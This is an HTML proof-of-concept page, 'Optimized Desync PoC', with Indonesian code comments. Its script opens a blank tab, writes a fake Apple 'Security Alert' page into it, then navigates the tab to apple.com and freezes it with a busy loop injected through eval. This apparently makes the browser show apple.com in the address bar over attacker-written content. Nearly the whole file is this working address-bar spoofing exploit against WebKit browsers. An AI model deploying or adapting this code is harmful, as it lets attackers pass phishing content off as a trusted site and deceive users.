<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Optimized Desync PoC - Zero</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #fafafa;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100%;
      }
      button {
        padding: 20px 40px;
        font-size: 20px;
        font-weight: bold;
        background: #007aff;
        color: #fff;
        border: none;
        border-radius: 14px;
        cursor: pointer;
        box-shadow: 0 6px 20px rgba(0, 122, 255, 0.3);
        transition: transform 0.1s ease;
      }
      button:active {
        transform: scale(0.96);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <button id="startBtn">CLICK TO TEST DESYNC</button>
    </div>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.style.display = 'none';

        // Membuka tab baru (about:blank)
        const newTab = window.open("about:blank", "_blank");

        if (newTab) {
          // Menyuntikkan konten kustom penyerang ke dalam DOM tab baru
          newTab.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
              <title>Apple</title>
              <meta name="viewport" content="width=device-width, initial-scale=1">
            </head>
            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
              <div>
                <h1 style="font-size:42px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">Security Alert</h1>
                <p style="font-size:20px;color:#86868b;margin:0;">Verifying trusted origin connection...</p>
              </div>
            </body>
            </html>
          `);
          newTab.document.close();

          // Tahap 1: Memicu navigasi asinkron ke domain target (apple.com) lebih cepat
          setTimeout(() => {
            try {
              newTab.location.href = "https://apple.com";
            } catch (err) {
              console.error(err);
            }
          }, 20);

          // Tahap 2: Memaksa thread blocking langsung DI DALAM konteks tab baru via eval/function injection
          setTimeout(() => {
            try {
              // Menjalankan skrip blocking secara langsung di dalam window target agar engine WebKit-nya terjebak
              newTab.eval(`
                const start = Date.now();
                while (Date.now() - start < 2000) {
                  // Intensive sync loop untuk menahan thread rendering tab baru
                }
              `);
            } catch (e) {
              // Fallback jika dibatasi cross-origin context
              let start = Date.now();
              while (Date.now() - start < 2000) {}
            }
          }, 250);
        }
      };
    </script>
  </body>
</html>
